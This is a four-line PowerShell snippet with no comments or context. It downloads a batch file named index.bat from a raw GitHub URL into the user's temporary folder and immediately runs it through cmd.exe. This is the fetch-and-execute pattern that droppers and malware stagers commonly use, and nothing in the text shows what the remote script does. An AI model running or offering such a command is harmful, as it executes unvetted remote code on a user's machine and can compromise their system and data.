$batchScriptUrl = 'https://raw.githubusercontent.com/SingendPfeil2/ascii/main/index.bat'
$batchScriptPath = "$env:TEMP\index.bat"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/SingendPfeil2/ascii/main/index.bat -OutFile $env:TEMP\index.bat
Start-Process 'cmd.exe' "/c $env:TEMP\index.bat"
